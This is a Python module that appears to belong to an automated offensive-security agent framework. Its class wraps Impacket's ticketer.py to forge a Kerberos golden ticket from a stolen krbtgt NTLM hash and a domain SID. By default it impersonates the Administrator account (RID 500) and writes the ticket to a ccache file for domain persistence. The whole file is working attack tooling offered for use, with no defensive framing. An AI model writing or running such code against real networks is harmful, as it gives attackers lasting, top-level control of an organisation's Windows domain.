"""Golden Ticket Agent - Create golden tickets for domain persistence"""
import asyncio, os, logging
from typing import Dict, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData

log = logging.getLogger(__name__)

class GoldenTicketAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="GoldenTicketAgent", description="Create golden tickets using krbtgt hash", version="1.0.0")
        self.output_dir = "workspace/golden_ticket"
        os.makedirs(self.output_dir, exist_ok=True)
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        try:
            domain, domain_sid, krbtgt_hash = strategy.get('domain'), strategy.get('domain_sid'), strategy.get('krbtgt_hash')
            username = strategy.get('username', 'Administrator')
            user_id = strategy.get('user_id', '500')
            
            if not all([domain, domain_sid, krbtgt_hash]):
                return AgentData(success=False, errors=["Missing required parameters: domain, domain_sid, krbtgt_hash"])
            
            # Use Impacket ticketer.py
            ticket_file = f'{self.output_dir}/{username}.ccache'
            cmd = ['ticketer.py', '-nthash', krbtgt_hash, '-domain-sid', domain_sid, '-domain', domain, '-user-id', user_id, username]
            
            process = await asyncio.create_subprocess_exec(*cmd, cwd=self.output_dir, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            stdout, stderr = await process.communicate()
            
            if process.returncode == 0:
                return AgentData(success=True, data={'ticket_file': ticket_file, 'username': username, 'raw_output': stdout.decode()})
            else:
                return AgentData(success=False, errors=[stderr.decode()])
        except Exception as e:
            return AgentData(success=False, errors=[str(e)])
